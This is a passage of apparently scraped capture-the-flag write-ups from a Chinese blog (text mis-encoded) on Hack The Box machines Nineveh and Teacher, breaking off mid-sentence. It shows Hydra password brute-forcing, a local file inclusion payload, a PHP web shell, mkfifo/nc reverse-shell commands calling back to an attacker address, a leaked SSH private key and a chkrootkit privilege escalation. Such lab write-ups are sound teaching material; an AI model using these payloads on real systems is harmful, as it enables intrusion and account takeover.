\\/_/ v1.5.0 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : https://10.10.10.43/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 200 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 ________________________________________________ db [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 1489ms] server-status [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 351ms] [Status: 200, Size: 49, Words: 3, Lines: 2, Duration: 378ms] :: Progress: [30000/30000] :: Job [1/1] :: 134 req/sec :: Duration: [0:05:04] :: Errors: 38 :: é¦–å…ˆçœ‹ä¸€ä¸‹ http çš„å†…å®¹ è¿™è¾¹æœ‰ä¸ªç™»å½•å£ï¼Œå¯ä»¥å¯¹è´¦å·è¿›è¡Œéå†ï¼Œå¾—åˆ°äº†ä¸€ä¸ªè´¦å· adminï¼Œå¯¹å¯†ç è¿›è¡Œä¸€ä¸‹å°è¯•çˆ†ç ´ â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 -V -f http-post-form &#39;/department/login.php:username=^USER^&amp;password=^PASS^:invalid password&#39; Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-07 14:11:26 [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task [DATA] attacking http-post-form://10.10.10.43:80/department/login.php:username=^USER^&amp;password=^PASS^:invalid password [80][http-post-form] host: 10.10.10.43 login: admin password: 1q2w3e4r5t [STATUS] attack finished for 10.10.10.43 (valid pair found) 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-07 14:38:57 æˆåŠŸæ‹¿åˆ°ä¸€ä¸ªè´¦å·å¯†ç  username = admin password = 1q2w3e4r5t æˆåŠŸç™»å…¥åå° æ¼æ´åˆ©ç”¨Have you fixed the login page yet! hardcoded username and password is really bad idea! check your serect folder to get in! figure it out! this is your challenge Improve the db interface. ~amrois åœ¨ notes ä¸­å‘ç°äº†ä¸€ä¸ªæç¤º è¿™è¾¹çš„åŸŸåå¾ˆæœ‰è¶£ï¼Œhttp://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt æˆ‘çŒœæµ‹åº”è¯¥æ˜¯å…·æœ‰ LFI çš„ï¼Œå°è¯•è¿›è¡Œåˆ©ç”¨ http://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt../../../../../../../etc/passwd æˆåŠŸç»•è¿‡è·å¾—ä¸€ä¸ª LFI æ¼æ´ http://10.10.10.43/department/manage.php?notes=/ninevehNotes.txt/../etc/passwd å¯¹ poc é•¿åº¦è¿›è¡Œäº†ä¸€ä¸‹ç®€åŒ– è¿™è¾¹æ‰¾åˆ°ä¸€ä¸ª phpinfo é¡µé¢ http://10.10.10.43/info.php æš‚æ—¶æ²¡ä»€ä¹ˆæ€è·¯è¿›è¡Œç ´è§£ï¼Œçœ‹çœ‹ https çš„å†…å®¹å§ è¿™è¾¹è¿˜æ˜¯éœ€è¦çˆ†ç ´ â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# hydra 10.10.10.43 -l admin -P /usr/share/wordlists/rockyou.txt -V -f https-post-form &#39;/db/index.php:password=^PASS^&amp;remember=yes&amp;logn=Log+In&amp;proc_login=true:Incorrect password&#39; Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-07 15:05:26 [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task [DATA] attacking http-post-forms://10.10.10.43:443/db/index.php:password=^PASS^&amp;remember=yes&amp;logn=Log+In&amp;proc_login=true:Incorrect password [443][http-post-form] host: 10.10.10.43 login: admin password: password123 [STATUS] attack finished for 10.10.10.43 (valid pair found) 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-07 15:34:26 è·å¾—äº†ä¸€ä¸ªå¯†ç  password123 æˆåŠŸè¿›å…¥ç®¡ç†é¢æ¿ https://www.exploit-db.com/exploits/24044 æ ¹æ®é¢æ¿çš„ç‰ˆæœ¬ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªè¿œç¨‹ PHP ä»£ç æ³¨å…¥ æ–°å»ºä¸€ä¸ªæ–‡ç«  &lt;?php echo system($_REQUEST[&quot;cmd&quot;]);?&gt; ç„¶åå†™å…¥ä¸€å¥è¯æœ¨é©¬ æ¥ç€ä¿®æ”¹ä¸€ä¸‹åŠ è½½çš„åº“ æˆåŠŸæ‰§è¡Œå‘½ä»¤ï¼Œç„¶åä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œæ¥ç€æ„é€ ä¸€ä¸ªåå¼¹ shell çš„ poc http://10.10.10.43/department/manage.php?notes=/var/tmp/ninevehNotes.php&amp;cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2%3E%261|nc+10.10.14.19+4444+%3E/tmp/f â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.19] from (UNKNOWN) [10.10.10.43] 57110 /bin/sh: 0: can&#39;t access tty; job control turned off $ python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;; www-data@nineveh:/var/www/html/department$ whoami&amp;&amp;id whoami&amp;&amp;id www-data uid=33(www-data) gid=33(www-data) groups=33(www-data) æˆåŠŸå¾—åˆ°ä¸€ä¸ª shel æƒé™æå‡Userwww-data@nineveh:/var/www/ssl/secure_notes$ ls ls index.html nineveh.png www-data@nineveh:/var/www/ssl/secure_notes$ file nineveh.png file nineveh.png nineveh.png: PNG image data, 1497 x 746, 8-bit/color RGB, non-interlaced åœ¨ &#x2F;var&#x2F;www&#x2F;ssl&#x2F;secure_notes ç›®å½•ä¸­æ‰¾åˆ°äº†ä¸€ä¸ªåä¸º nineveh.png çš„å›¾ç‰‡ï¼Œå»è®¿é—®ä¸€ä¸‹çœ‹çœ‹ https://10.10.10.43/secure_notes&#x2F;nineveh.png åœ¨è¿™æ˜¾ç¤ºä¸ªè¿™ä¸ªï¼Œè‚¯å®šä¸å¤ªå¯¹åŠ²ï¼Œä¼°è®¡æ˜¯æœ‰æ–‡ä»¶éšå†™ï¼ŒæŸ¥çœ‹ä¸€ä¸‹ www-data@nineveh:/var/www/ssl/secure_notes$ strings nineveh.png strings nineveh.png -----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5 FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI 3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo 9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl 1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89 P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1 MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7 fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG -----END RSA PRIVATE KEY----- secret/nineveh.pub 0000644 0000041 0000041 00000000620 13126060277 014541 ustar www-data www-data ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb æ‰¾åˆ°äº†ä¸€ä¸² sshkey www-data@nineveh:/var/www/ssl/secure_notes$ cat /etc/passwd |grep bash cat /etc/passwd |grep bash root:x:0:0:root:/root:/bin/bash amrois:x:1000:1000:,,,:/home/amrois:/bin/bash æ‰¾åˆ°äº†æˆ‘ä»¬å¯ä»¥ç™»é™†çš„è´¦æˆ· amrois ç„¶åæŠŠ sshkey ä¿å­˜ä¸º id_rsa ç»™äºˆ 600 æƒé™ chmod 600 id_rsa æµ‹è¯•åå‘ç° 22 ç«¯å£æ²¡æœ‰æ‰“å¼€ï¼Œæˆ‘ä»¬è¿˜å¾—æƒ³åŠæ³•æ‰“å¼€ 22 ç«¯å£ www-data@nineveh:/var/www/html/department$ cat /etc/knockd.conf cat /etc/knockd.conf [options] logfile = /var/log/knockd.log interface = ens160 [openSSH] sequence = 571, 290, 911 seq_timeout = 5 start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn [closeSSH] sequence = 911,290,571 seq_timeout = 5 start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn æ‰¾åˆ°äº†ä¸€ä¸ªæ–‡ä»¶ï¼ŒæŸ¥çœ‹äº†ä¸€ä¸‹ï¼Œç™¾åº¦äº†ä¸€ä¸‹ï¼Œåº”è¯¥æ˜¯ä¸€ä¸ªç«¯å£æ•²é—¨ https://lingwu111.github.io/ç«¯å£æ•²é—¨æŠ€æœ¯.html æ‰¾åˆ°äº†ä¸€ç¯‡æ–‡ç« ï¼Œè®²è§£äº†ç«¯å£æ•²é—¨çš„åŸç† ç®€å•çš„è¯´ï¼Œå°±æ˜¯æˆ‘ä»¬å¾—ä¾æ¬¡è®¿é—® 571ã€290ã€911 è¿™ä¸‰ä¸ªç«¯å£ï¼Œç„¶åè¾¾æˆä¸€ä¸ªå©å©å©æ•²é—¨çš„æ•ˆæœï¼Œç„¶åé˜²ç«å¢™å°±ä¼šæ¥å¼€é—¨ï¼ŒæŠŠ 22 ç«¯å£å‘æˆ‘ä»¬å¼€æ”¾ for x in 571 290 911 ; do nmap -Pn --host-timeout 201 --max-retries 0 -p $x 10.10.10.43; done ç¼–å†™å¥½ç›¸å…³è¯­å¥ï¼Œå»å¼€å§‹æ•²é—¨å§ â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# nmap -p22 10.10.10.43 Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-08 12:20 CST Nmap scan report for 10.10.10.43 Host is up (0.42s latency). PORT STATE SERVICE 22/tcp filtered ssh Nmap done: 1 IP address (1 host up) scanned in 4.79 seconds â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# for x in 571 290 911 ; do nmap -Pn --host-timeout 201 --max-retries 0 -p $x 10.10.10.43; done Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-08 12:20 CST Warning: 10.10.10.43 giving up on port because retransmission cap hit (0). Nmap scan report for 10.10.10.43 Host is up. PORT STATE SERVICE 571/tcp filtered umeter Nmap done: 1 IP address (1 host up) scanned in 1.07 seconds Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-08 12:20 CST Warning: 10.10.10.43 giving up on port because retransmission cap hit (0). Nmap scan report for 10.10.10.43 Host is up. PORT STATE SERVICE 290/tcp filtered unknown Nmap done: 1 IP address (1 host up) scanned in 1.07 seconds Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-08 12:20 CST Warning: 10.10.10.43 giving up on port because retransmission cap hit (0). Nmap scan report for 10.10.10.43 Host is up. PORT STATE SERVICE 911/tcp filtered xact-backup Nmap done: 1 IP address (1 host up) scanned in 1.08 seconds â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# nmap -p22 10.10.10.43 Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-08 12:20 CST Nmap scan report for 10.10.10.43 Host is up (0.38s latency). PORT STATE SERVICE 22/tcp open ssh Nmap done: 1 IP address (1 host up) scanned in 0.83 seconds æˆåŠŸæ•²å¼€ 22 ç«¯å£ å»è¿æ¥ ssh â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# ssh amrois@10.10.10.43 -i id_rsa The authenticity of host &#39;10.10.10.43 (10.10.10.43)&#39; can&#39;t be established. ED25519 key fingerprint is SHA256:kxSpgxC8gaU9OypTJXFLmc/2HKEmnDMIjzkkUiGLyuI. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;10.10.10.43&#39; (ED25519) to the list of known hosts. Ubuntu 16.04.2 LTS Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 288 packages can be updated. 207 updates are security updates. You have mail. Last login: Mon Jul 3 00:19:59 2017 from 192.168.0.14 amrois@nineveh:~$ whoami&amp;&amp;id amrois uid=1000(amrois) gid=1000(amrois) groups=1000(amrois) æˆåŠŸææƒåˆ° user æƒé™ amrois@nineveh:~$ ls user.txt amrois@nineveh:~$ cat user.txt e451f28264547fd414a407d0c8fccb78 æˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶ Rooté¦–å…ˆè·‘ä¸€ä¸ª linpeas.sh â•”â•â•â•â•â•â•â•â•â•â•â•£ SGID â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid -rwxr-sr-x 1 root shadow 35K Mar 16 2016 /sbin/pam_extrausers_chkpwd -rwxr-sr-x 1 root shadow 35K Mar 16 2016 /sbin/unix_chkpwd -rwxr-sr-x 1 root utmp 10K Mar 11 2016 /usr/lib/x86_64-linux-gnu/utempter/utempter -rwxr-sr-x 1 root tty 15K Mar 1 2016 /usr/bin/bsd-write -rwxr-sr-x 1 root utmp 425K Feb 7 2016 /usr/bin/screen ---&gt; GNU_Screen_4.5.0 -rwxr-sr-x 1 root shadow 61K Mar 29 2016 /usr/bin/chage -rwxr-sr-x 1 root mlocate 39K Nov 18 2014 /usr/bin/mlocate -rwxr-sr-x 1 root ssh 351K Mar 16 2017 /usr/bin/ssh-agent -rwxr-sr-x 1 root crontab 36K Apr 5 2016 /usr/bin/crontab -rwsr-sr-x 1 daemon daemon 51K Jan 14 2016 /usr/bin/at ---&gt; RTru64_UNIX_4.0g(CVE-2002-1614) -rwxr-sr-x 1 root shadow 23K Mar 29 2016 /usr/bin/expiry -rwxr-sr-x 1 root tty 27K Dec 16 2016 /usr/bin/wall è¿™è¾¹æ˜¯çœ‹åˆ°æœ‰æƒé™å¯¹ crontab è¿›è¡Œæ‰§è¡Œçš„ï¼Œå»æŸ¥çœ‹ä¸€ä¸‹ amrois@nineveh:~$ crontab -l # Edit this file to introduce tasks to be run by cron. # # Each task to run has to be defined through a single line # indicating with different fields when the task will be run # and what command to run for the task # # To define the time you can provide concrete values for # minute (m), hour (h), day of month (dom), month (mon), # and day of week (dow) or use &#39;*&#39; in these fields (for &#39;any&#39;).# # Notice that tasks will be started based on the cron&#39;s system # daemon&#39;s notion of time and timezones. # # Output of the crontab jobs (including errors) is sent through # email to the user the crontab file belongs to (unless redirected). # # For example, you can run a backup of all your user accounts # at 5 a.m every week with: # 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/ # # For more information see the manual pages of crontab(5) and cron(8) # # m h dom mon dow command */10 * * * * /usr/sbin/report-reset.sh æ‰¾åˆ°äº†ä¸€ä¸ªè„šæœ¬ amrois@nineveh:~$ cat /usr/sbin/report-reset.sh #!/bin/bash rm -rf /report/*.txt amrois@nineveh:~$ ls -la /report/ total 24 drwxr-xr-x 2 amrois amrois 4096 Jul 8 00:21 . drwxr-xr-x 24 root root 4096 Jan 29 2021 .. -rw-r--r-- 1 amrois amrois 4815 Jul 8 00:20 report-22-07-08:00:20.txt -rw-r--r-- 1 amrois amrois 4815 Jul 8 00:21 report-22-07-08:00:21.txt ä¸å¤ªäº†è§£æ˜¯ä»€ä¹ˆï¼Œå»çœ‹ä¸‹æŸ¥è¯¢ä¸€ä¸‹ åœ¨æŸ¥è¯¢ä»¥åŠè·‘äº†ä¸€ä¸ª pspy åï¼Œå¾—åˆ°äº†ä¸€ä¸ªä¸€ç›´æŒç»­è¿è¡Œç€çš„æ–‡ä»¶ &#x2F;usr&#x2F;bin&#x2F;chkrootkit https://www.exploit-db.com/exploits/33899 ç»è¿‡æŸ¥æ‰¾åï¼Œæ‰¾åˆ°äº†è¿™ä¹ˆä¸€ä¸ªæ¼æ´ ç„¶ååœ¨ &#x2F;tmp ä¸‹åˆ›å»ºä¸€ä¸ªåä¸º update çš„æ–‡ä»¶ï¼Œå†™å…¥å¦‚ä¸‹å†…å®¹ #!/bin/bash rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.19 4444 &gt;/tmp/f ç»™ update ä¸€ä¸ªæ‰§è¡Œæƒé™ chmod +x /tmp/update ç„¶åä½¿ç”¨ nc å¼€å¯ä¸€ä¸ªç«¯å£ç›‘å¬ ç­‰å¾… shell å›æ¥å°±å¯ä»¥äº† â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.19] from (UNKNOWN) [10.10.10.43] 57140 /bin/sh: 0: can&#39;t access tty; job control turned off # whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root) æˆåŠŸææƒåˆ° root æƒé™ # cat /root/root.txt a35547e94d50dd524433ee8e427733ea æˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Teacher - Hackthebox","slug":"Hackthebox - Teacher","date":"2022-06-30T11:38:36.000Z","updated":"2023-05-20T03:15:08.000Z","comments":true,"path":"2022/06/30/Hackthebox - Teacher/","link":"","permalink":"http://www.lucifiel.com/2022/06/30/Hackthebox%20-%20Teacher/","excerpt":"","text":"Hackthebox - Teacheré¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æ”¶é›†Nmapâ”Œâ”€â”€(rootğŸ’€lucifiel)-[~] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.153 Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-30 09:20 CST Nmap scan report for 10.10.10.153 Host is up (0.17s latency). Not shown: 65534 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Blackhat highschool No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=6/30%OT=80%CT=1%CU=36344%PV=Y%DS=2%DC=T%G=Y%TM=62BCFA9 OS:9%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=107%TI=Z%CI=I%II=I%TS=8)OPS OS:(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST1 OS:1NW7%O6=M539ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN OS:(R=Y%DF=Y%T=40%W=7210%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S) Network Distance: 2 hops TRACEROUTE (using port 22/tcp) HOP RTT ADDRESS 1 170.79 ms 10.10.14.1 2 171.01 ms 10.10.10.153 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 40.07 seconds Http Fuzzâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# ffuf -u &#39;http://10.10.10.153/FUZZ&#39; -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://10.10.10.153/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 200 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 ________________________________________________ fonts [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 342ms] phpmyadmin [Status: 403, Size: 297, Words: 22, Lines: 12, Duration: 339ms] manual [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 355ms] images [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 5521ms] css [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 5521ms] javascript [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 5542ms] js [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 6427ms] moodle [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 340ms] server-status [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 345ms] [Status: 200, Size: 8028, Words: 514, Lines: 250, Duration: 1349ms] :: Progress: [30000/30000] :: Job [1/1] :: 161 req/sec :: Duration: [0:02:01] :: Errors: 96 :: æŒ¨ä¸ªè®¿é—®åå‘ç° phpmyadmin æ— æƒé™è®¿é—®ï¼Œmanual å¾—åˆ°äº†ä¸€ä¸ªä¿¡æ¯ï¼Œè¯¥é¶æœºä½¿ç”¨çš„ä¸­é—´ä»¶æ˜¯ Apache HTTP Server Version 2.4ã€‚è®¿é—® moodle ç›®å½•ä¼šè·³è½¬åˆ° http://teacher.htb/moodleï¼Œæˆ‘ä»¬å»åŠ ä¸€ä¸ªhosts echo 10.10.10.153 teacher.htb &gt;&gt; /etc/hosts è¿™è¾¹æ‹¿åˆ°äº†ä¸€ä¸ªè´¦å·ï¼Œä½†æ˜¯æ²¡æœ‰å¯†ç ï¼Œå»çœ‹çœ‹å…¶ä»–æ€è·¯ã€‚ è¿™å¼ å›¾ç‰‡ä¸€çœ‹å°±æœ‰ç‚¹ä¸å¯¹ï¼Œæˆ‘ä»¬å»è®¿é—®ä¸€ä¸‹çœ‹çœ‹ æ–‡ä»¶æŸåï¼Ÿä¸‹è½½ä¸‹æ¥çœ‹çœ‹ â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# wget http://teacher.htb/images/5.png --2022-06-30 10:42:06-- http://teacher.htb/images/5.png æ­£åœ¨è§£æä¸»æœº teacher.htb (teacher.htb)... 10.10.10.153 æ­£åœ¨è¿æ¥ teacher.htb (teacher.htb)|10.10.10.153|:80... å·²è¿æ¥ã€‚ å·²å‘å‡º HTTP è¯·æ±‚ï¼Œæ­£åœ¨ç­‰å¾…å›åº”... 200 OK é•¿åº¦ï¼š200 [image/png] æ­£åœ¨ä¿å­˜è‡³: â€œ5.pngâ€ 5.png 100%[========================================================================================================================================&gt;] 200 --.-KB/s ç”¨æ—¶ 0s 2022-06-30 10:42:07 (14.1 MB/s) - å·²ä¿å­˜ â€œ5.pngâ€ [200/200]) â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# ls 5.png â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# file 5.png 5.png: ASCII text è¿™æ˜¯ä¸€ä¸ª text æ–‡æœ¬æ–‡ä»¶ï¼Œè¯»å–ä¸€ä¸‹å†…å®¹ â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# cat 5.png Hi Servicedesk, I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha. Could you guys figure out what the last charachter is, or just reset it? Thanks, Giovanni å¾—åˆ°äº†ä¸€ä¸ªè´¦å·å¯†ç ï¼Œä½†å¯†ç çš„æœ€åä¸€ä½ä¸ç¡®å®š username = Giovanni password = Th4C00lTheacha? æˆ‘ä»¬å»çˆ†ç ´ä¸€ä¸‹æœ€åä¸€ä½å¯†ç  æ¼æ´åˆ©ç”¨é¦–å…ˆä½¿ç”¨ç°æœ‰çš„å¯†ç å»ç”Ÿæˆä¸€ä¸ªå¯†ç å­—å…¸ Th4C00lTheachaa Th4C00lTheachab Th4C00lTheachac Th4C00lTheachad Th4C00lTheachae Th4C00lTheachaf Th4C00lTheachag Th4C00lTheachah Th4C00lTheachai Th4C00lTheachaj Th4C00lTheachak Th4C00lTheachal Th4C00lTheacham Th4C00lTheachan Th4C00lTheachao Th4C00lTheachap Th4C00lTheachaq Th4C00lTheachar Th4C00lTheachas Th4C00lTheachat Th4C00lTheachau Th4C00lTheachav Th4C00lTheachaw Th4C00lTheachax Th4C00lTheachay Th4C00lTheachaz Th4C00lTheacha! Th4C00lTheacha@ Th4C00lTheacha# Th4C00lTheacha$ Th4C00lTheacha% Th4C00lTheacha^ Th4C00lTheacha&amp; Th4C00lTheacha* Th4C00lTheacha( Th4C00lTheacha) Th4C00lTheacha_ Th4C00lTheacha- Th4C00lTheacha+ Th4C00lTheacha= Th4C00lTheacha. Th4C00lTheacha? Th4C00lTheacha/ Th4C00lTheacha\\ Th4C00lTheacha0 Th4C00lTheacha1 Th4C00lTheacha2 Th4C00lTheacha3 Th4C00lTheacha4 Th4C00lTheacha5 Th4C00lTheacha6 Th4C00lTheacha7 Th4C00lTheacha8 Th4C00lTheacha9 ç„¶åå»çˆ†ç ´ä¸€ä¸‹ è¿™è¾¹ Th4C00lTheacha# çš„ç»“æœä¸ä¸€æ ·ï¼Œå°±æ˜¯æ­£ç¡®å¯†ç äº†ï¼Œæˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸ªè´¦å·å¯†ç  username = Giovanni password = Th4C00lTheacha# è¿™è¾¹é’ˆå¯¹ moodle 